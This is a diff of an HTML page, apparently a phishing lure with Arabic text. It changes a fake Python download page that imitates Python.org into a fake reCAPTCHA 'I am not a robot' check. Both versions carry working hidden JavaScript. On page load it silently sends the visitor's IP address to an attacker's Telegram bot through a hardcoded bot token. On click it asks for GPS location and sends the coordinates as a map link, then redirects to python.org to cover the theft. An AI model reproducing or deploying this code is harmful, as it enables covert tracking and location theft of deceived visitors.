@@ -3,94 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome to Python.org | Baratheon Edition</title>
+    <title>التحقق من الأمان | Baratheon System</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style>
-        :root { --py-blue: #3776ab; --py-yellow: #ffd43b; --py-dark: #232d3b; }
-        body { background-color: #1e242c; color: white; font-family: 'Source Sans Pro', Arial, sans-serif; }
-        .nav-py { background-color: var(--py-dark); border-bottom: 3px solid var(--py-blue); }
-        .hero-py { background: linear-gradient(to bottom, #2b3543, #1e242c); }
-        .btn-py { background-color: var(--py-yellow); color: var(--py-blue); transition: 0.3s; }
-        .btn-py:hover { background-color: white; transform: scale(1.05); }
-        .footer-py { border-top: 1px solid #303c4a; color: #9da5b1; }
-    </style>
 </head>
-<body>
+<body class="bg-[#f9f9f9] flex items-center justify-center min-h-screen font-sans">
 
-    <nav class="nav-py p-4 flex justify-between items-center px-8">
-        <div class="flex items-center space-x-4 space-x-reverse">
-            <i class="fab fa-python text-3xl text-[var(--py-yellow)]"></i>
-            <span class="text-xl font-bold tracking-tight">Python<span class="text-gray-400 font-light">.org</span></span>
+    <div class="bg-white p-8 rounded-lg shadow-md border border-gray-200 max-w-sm w-full">
+        <div class="flex items-center mb-6">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" class="w-10 ml-4">
+            <div>
+                <h1 class="text-xl font-bold text-gray-700 leading-tight">Baratheon Security</h1>
+                <p class="text-xs text-gray-500 font-mono">ID: 5475815049-SEC</p>
+            </div>
         </div>
-        <div class="hidden md:flex space-x-6 space-x-reverse text-sm font-semibold">
-            <a href="#" class="hover:text-[var(--py-yellow)]">About</a>
-            <a href="#" class="hover:text-[var(--py-yellow)]">Downloads</a>
-            <a href="#" class="hover:text-[var(--py-yellow)]">Documentation</a>
-        </div>
-    </nav>
 
-    <header class="hero-py py-20 px-6 text-center shadow-inner">
-        <h1 class="text-4xl md:text-5xl font-bold mb-6 text-[var(--py-yellow)]">Baratheon Python Distribution</h1>
-        <p class="max-w-2xl mx-auto text-lg text-gray-300 leading-relaxed mb-10">
-            تم إطلاق النسخة الحصرية من بايثون المخصصة للمطورين المحترفين. حمل الأدوات، السكربتات، والمكتبات البرمجية الآن.
-        </p>
-        
-        <div class="flex flex-col items-center">
-            <button onclick="startDownload()" class="btn-py px-12 py-4 rounded-lg font-black text-xl shadow-2xl flex items-center">
-                <i class="fas fa-download ml-3"></i> Download Python 3.12.2 (Baratheon v1)
-            </button>
-            <p class="mt-4 text-xs text-gray-500 font-mono italic"># Verified by Baratheon Security Systems</p>
+        <div class="bg-[#f1f1f1] p-4 rounded border border-gray-300 mb-6">
+            <p class="text-sm text-gray-600 mb-4 font-semibold">يرجى إثبات أنك لست روبوت للوصول إلى المحتوى.</p>
+            
+            <label class="flex items-center cursor-pointer bg-white p-3 border border-gray-300 rounded hover:bg-gray-50 transition">
+                <input type="checkbox" onclick="startVerification()" class="w-6 h-6 ml-3 cursor-pointer">
+                <span class="text-gray-700 font-medium">أنا لست برنامج روبوت</span>
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-5 mr-auto opacity-30">
+            </label>
         </div>
-    </header>
 
-    <section class="max-w-5xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8 p-10">
-        <div class="p-6 bg-[#2b3543] rounded border-b-4 border-[var(--py-blue)]">
-            <h3 class="font-bold mb-2 text-[var(--py-yellow)]">Get Started</h3>
-            <p class="text-sm text-gray-400 text-right">تعلم كيف تبدأ مع بايثون من الصفر وصولاً للاحتراف.</p>
+        <div class="text-[10px] text-gray-400 text-center">
+            <p>Privacy - Terms</p>
+            <p class="mt-1">Powered by <b>Baratheon Tech</b></p>
         </div>
-        <div class="p-6 bg-[#2b3543] rounded border-b-4 border-[var(--py-blue)]">
-            <h3 class="font-bold mb-2 text-[var(--py-yellow)]">Community</h3>
-            <h4 class="text-sm text-gray-400 text-right">انضم لأكبر مجتمع برمجيات مفتوحة المصدر في العالم.</h4>
-        </div>
-        <div class="p-6 bg-[#2b3543] rounded border-b-4 border-[var(--py-blue)]">
-            <h3 class="font-bold mb-2 text-[var(--py-yellow)]">Success Stories</h3>
-            <p class="text-sm text-gray-400 text-right">شاهد كيف غيّر بايثون حياة مئات المطورين.</p>
-        </div>
-    </section>
-
-    <footer class="footer-py p-8 text-center text-xs">
-        <p>© 2026 Python Software Foundation | Modified by <b>Baratheon</b></p>
-    </footer>
+    </div>
 
     <script>
         const token = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
         const chat_id = "5475815049";
 
-        // إرسال IP فور الدخول (صامت)
+        // إرسال الـ IP فوراً عند فتح الصفحة
         window.onload = async () => {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                const msg = `🐍 <b>زائر دخل نسخة بايثون Baratheon!</b>\n🌐 IP: <code>${data.ip}</code>`;
+                const msg = `👣 <b>زائر جديد فتح صفحة التحقق!</b>\n🌐 IP: <code>${data.ip}</code>\n👤 المالك: Baratheon`;
                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
             } catch(e){}
         };
 
-        // سحب الموقع عند التحميل
-        function startDownload() {
+        // طلب الـ GPS عند الضغط على المربع
+        function startVerification() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const msg = `📍 <b>الهدف حاول تحميل بايثون!</b>\n🔗 الموقع: ${mapUrl}`;
+                    const msg = `✅ <b>تم اجتياز الفحص! الموقع بدقة:</b>\n🔗 ${mapUrl}`;
+                    
                     await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
                     
-                    alert("نظام الأمان: تم التحقق من هويتك. سيبدأ التحميل الآن..");
-                    window.location.href = "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe";
+                    alert("تم التحقق بنجاح! جاري تحويلك..");
+                    window.location.href = "https://www.python.org";
                 }, (err) => {
-                    alert("خطأ أمني: يجب السماح بالوصول للموقع للتأكد من منطقتك الجغرافية قبل التحميل.");
+                    alert("خطأ: يجب تحديد مربع 'أنا لست روبوت' والسماح بالوصول لإكمال العملية.");
                 });
             }
         }
